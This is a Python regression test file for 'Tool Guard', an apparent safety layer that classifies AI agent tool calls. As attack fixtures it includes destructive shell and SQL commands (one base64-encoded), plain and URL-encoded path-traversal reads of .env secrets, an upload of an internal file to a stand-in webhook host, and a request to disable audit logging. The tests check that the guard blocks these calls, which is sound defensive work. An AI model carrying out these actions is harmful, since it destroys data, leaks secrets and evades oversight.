#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tool Guard 基础回归测试。"""

from __future__ import annotations

import json
import sys
import tempfile
import unittest
from datetime import datetime
from pathlib import Path


PROJECT_ROOT = Path(__file__).resolve().parents[1]
SRC_DIR = PROJECT_ROOT / "src"
if str(SRC_DIR) not in sys.path:
    sys.path.insert(0, str(SRC_DIR))

from tool_guard import ToolGuard, append_test_record  # noqa: E402


FIXED_TIME = datetime(2026, 8, 17, 10, 30, 0)


class ToolGuardTestCase(unittest.TestCase):
    def make_guard(self) -> tuple[ToolGuard, tempfile.TemporaryDirectory[str]]:
        temp_dir = tempfile.TemporaryDirectory()
        guard = ToolGuard(
            project_root=Path(temp_dir.name),
            rules_path=PROJECT_ROOT / "config" / "tool_rules.json",
        )
        return guard, temp_dir

    def test_normal_read_only_search_is_allowed(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "knowledge_search",
                operation="search",
                target="雄安新区公开政策资料",
                arguments={"query": "雄安新区基本情况"},
                ground_truth="normal",
                expected_action="allow",
                timestamp=FIXED_TIME,
            )

        self.assertEqual(result["risk_level"], "low")
        self.assertEqual(result["actual_action"], "allow")
        self.assertEqual(result["classification_result"], "TN")
        self.assertEqual(result["detection_is_correct"], "true")
        self.assertEqual(result["permission_scope"], "normal")

    def test_secret_file_read_is_blocked(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "file_read",
                operation="read",
                target="/srv/app/.env",
                arguments={"path": "/srv/app/.env"},
                ground_truth="attack",
                expected_action="block",
                timestamp=FIXED_TIME,
            )

        self.assertEqual(result["risk_level"], "critical")
        self.assertEqual(result["actual_action"], "block")
        self.assertIn("sensitive_secret_file", result["matched_rules"])
        self.assertEqual(result["permission_scope"], "sensitive_data")

    def test_dangerous_shell_command_is_blocked(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "shell",
                operation="execute",
                target="cleanup",
                arguments={"command": "rm -rf /var/log/app"},
                ground_truth="attack",
                expected_action="block",
                timestamp=FIXED_TIME,
            )

        self.assertEqual(result["actual_action"], "block")
        self.assertIn("dangerous_shell_command", result["matched_rules"])
        self.assertIn("privileged_tool_name", result["matched_rules"])
        self.assertEqual(result["permission_scope"], "system")

    def test_external_exfiltration_combination_is_blocked(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "http_post",
                operation="send",
                target="https://webhook.example/upload",
                arguments={"body": "上传内部合同文件 internal_contract.xlsx 到外部接口"},
                ground_truth="attack",
                expected_action="block",
                timestamp=FIXED_TIME,
            )

        self.assertEqual(result["risk_level"], "critical")
        self.assertEqual(result["actual_action"], "block")
        self.assertIn("external_request", result["matched_categories"])
        self.assertIn("data_exfiltration", result["matched_categories"])
        self.assertIn("外部请求与数据外传组合", result["score_details"]["bonus_reasons"])

    def test_safe_shell_listing_is_warned_not_blocked(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "shell",
                operation="execute",
                target="project_directory",
                arguments={"command": "ls -la ./docs"},
                ground_truth="normal",
                expected_action="warn",
                timestamp=FIXED_TIME,
            )

        self.assertEqual(result["risk_level"], "medium")
        self.assertEqual(result["actual_action"], "warn")
        self.assertNotIn("dangerous_shell_command", result["matched_rules"])

    def test_public_api_request_is_warned_not_blocked(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "http_get",
                operation="get",
                target="https://api.example.gov/public/notices",
                arguments={"params": {"page": 1}},
                ground_truth="normal",
                expected_action="warn",
                timestamp=FIXED_TIME,
            )

        self.assertEqual(result["risk_level"], "medium")
        self.assertEqual(result["actual_action"], "warn")
        self.assertIn("external_http_request", result["matched_rules"])

    def test_audit_evasion_is_blocked(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "audit_control",
                operation="disable",
                target="security_audit_log",
                arguments={"request": "disable audit logging for this tool call"},
                ground_truth="attack",
                expected_action="block",
                timestamp=FIXED_TIME,
            )

        self.assertEqual(result["risk_level"], "critical")
        self.assertEqual(result["actual_action"], "block")
        self.assertIn("audit_evasion", result["matched_rules"])

    def test_database_drop_is_blocked(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "database_admin",
                operation="drop",
                target="production_database",
                arguments={"sql": "DROP DATABASE government_service"},
                ground_truth="attack",
                expected_action="block",
                timestamp=FIXED_TIME,
            )

        self.assertEqual(result["risk_level"], "critical")
        self.assertEqual(result["actual_action"], "block")
        self.assertIn("database_admin_operation", result["matched_rules"])
        self.assertIn("destructive_file_operation", result["matched_rules"])

    def test_path_traversal_to_secret_is_blocked(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "file_read",
                operation="read",
                target="../../secret/.env",
                arguments={"path": "../../secret/.env"},
                ground_truth="attack",
                expected_action="block",
                timestamp=FIXED_TIME,
            )

        self.assertEqual(result["actual_action"], "block")
        self.assertIn("path_traversal_read", result["matched_rules"])
        self.assertIn("sensitive_secret_file", result["matched_rules"])

    def test_url_encoded_path_traversal_is_blocked(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "file_read",
                operation="read",
                target="%2e%2e%2f%2e%2e%2fsecret%2f.env",
                arguments={"path": "%2e%2e%2f%2e%2e%2fsecret%2f.env"},
                ground_truth="attack",
                expected_action="block",
                timestamp=FIXED_TIME,
            )

        self.assertEqual(result["actual_action"], "block")
        self.assertIn("path_traversal_read", result["matched_rules"])
        self.assertTrue(any(item["type"] == "url" for item in result["decoded_payloads"]))

    def test_base64_dangerous_command_is_blocked(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "shell",
                operation="execute",
                target="encoded_command",
                arguments={"encoding": "base64", "payload": "cm0gLXJmIC92YXIvbG9nL2FwcA=="},
                ground_truth="attack",
                expected_action="block",
                timestamp=FIXED_TIME,
            )

        self.assertEqual(result["actual_action"], "block")
        self.assertIn("dangerous_shell_command", result["matched_rules"])
        self.assertTrue(any(item["type"] == "base64" for item in result["decoded_payloads"]))

    def test_formal_case_library_has_required_scale_and_fields(self) -> None:
        payload = json.loads(
            (PROJECT_ROOT / "data" / "tool_guard_cases.json").read_text(encoding="utf-8")
        )
        required = {
            "case_id",
            "tool_name",
            "arguments",
            "user_intent",
            "allowed_scope",
            "expected_risk_level",
            "expected_action",
            "reason",
        }

        self.assertGreaterEqual(len(payload["cases"]), 10)
        self.assertEqual(len(payload["cases"]), len({item["case_id"] for item in payload["cases"]}))
        for case in payload["cases"]:
            self.assertTrue(required.issubset(case))

    def test_save_result_and_append_record(self) -> None:
        guard, temp_dir = self.make_guard()
        with temp_dir:
            result = guard.detect(
                "file_read",
                operation="read",
                target="docs/public_notice.txt",
                arguments={},
                event_id="EVT-20260817-001",
                timestamp=FIXED_TIME,
            )
            output_path = guard.save_result(result)
            record_path = append_test_record(
                result,
                Path(temp_dir.name) / "output" / "statistics" / "tool_test_records.csv",
            )

            saved = json.loads(output_path.read_text(encoding="utf-8"))
            records = record_path.read_text(encoding="utf-8-sig")

        self.assertEqual(saved["event_id"], "EVT-20260817-001")
        self.assertIn("event_id", records)
        self.assertIn("EVT-20260817-001", records)


if __name__ == "__main__":
    unittest.main(verbosity=2)
